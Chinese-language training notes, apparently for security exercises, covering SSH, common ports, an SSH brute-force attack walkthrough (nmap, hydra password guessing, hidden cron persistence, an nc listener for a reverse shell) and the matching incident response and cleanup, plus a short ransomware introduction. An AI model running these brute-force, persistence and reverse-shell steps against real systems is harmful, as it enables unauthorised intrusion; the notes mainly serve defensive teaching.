护网行动

ssh

一.ssh是什么

​ 安全外壳协议：ssh 一种加密的网络传输协议

​ 用途：远程登陆系统

​ xshell

二.常见端口对应的服务

22 ssh

445 smb (著名漏洞：ms17-010 永恒之蓝)

3306 MySQL

3389 rdp远程桌面连接服务

80 http

443 https

三.SSH爆破

1.信息收集

使用nmap扫描目标主机端口：nmap + ip

2.爆破SSH

​ 使用hydra(九头蛇）进行爆破

​ hydra -L users.txt -P password.txt ssh://ip

3.SSH登录

ssh 用户名@ip

4.尝试创建隐藏计划任务（权限维持）

​ 进入 /tmp 目录创建 task.sh 文件

​ 创建create_task.sh

​

5.尝试nc连接目标主机的shell

​ nc -lvp 7777

四.SSH端口爆破的应急响应方案

事件排查

1.查看网络连接的情况

​ netstat -antpl

​ 发现异常连接 /bash

2.查看守护进程

​ 查看进程树：pstree -p

​ 查看进程：systemctl status pid

​ 发现计划任务

3.查看计划任务

​ crontab -l : 未发现有计划任务，可能是隐藏计划任务

​ 查看 /var/spool/cron/crontabs 下的任务

​ 使用 cat -A root 或者 cat -vET root :可以看到隐藏内容或者vim root ：直接编辑也可以看到具体任务内容

4.找到task.sh 文件

​ ls -l /tmp/task.sh :查看文件上传时间

​ cat /tmp/task.sh :查看文件内容，发现是通过nc 反弹shell

溯源分析

1.分析任务文件 task.sh
（1）查看文件上传时间：ls -l /tmp/task.sh

​ 发现权限为root，说明攻击者以root账号登陆，很可能root账号密码被爆破

（2）查看登录日志

​ last -f /var/log/wtmp : kali下登陆成功的日志

​ last -f /var/log/btmp : kali下登录失败的日志，发现大量登录失败的日志

（3）总结

​ 爆破时间

​ 爆破账户

​ 攻击者ip

​ 成功爆破出系统的root账户密码，并且留crontab隐藏后门，任务执行文件task.sh

事件处置

1.删除计划任务，结束异常进程

​ 删除隐藏计划任务：crontab -r -u root

​ 杀掉恶意进程： kill pid

2.删除恶意文件

​ rm 文件名

3.修改密码，关闭root用户远程连接的权限

​ 修改密码 ： passwd root

​ 关闭root用户远程连接的权限： vim /etc/ssh/sshd_config : 修改PermitRootLogin为no，增强权限控制

4.修改ssh默认端口

​ vim /etc/ssh/sshd_config

​ 将22端口修改成其他端口，并将#删除

勒索病毒

一.简介

​ 勒索病毒是黑客通过锁屏、加密文件等方式劫持用户文件并以此敲诈用户钱财的恶意软件。黑客利用系统漏洞或通过网络钓鱼，邮件，程序木马，网页挂马等方式，向受害电脑或服务器植入病毒，进以加密硬盘上的文档乃至整个硬盘，之后向受害者索要数额不等的赎金后才予以解密。

​ 通常使用对称加密与非对称加密组合的形式加密，绝大数无法通过技术手段破解，必须拿到解密私钥才能解决，一般无法溯源，危害巨大

​ 常见勒索病毒—-WannaCry (17年通过ms17_010传播)
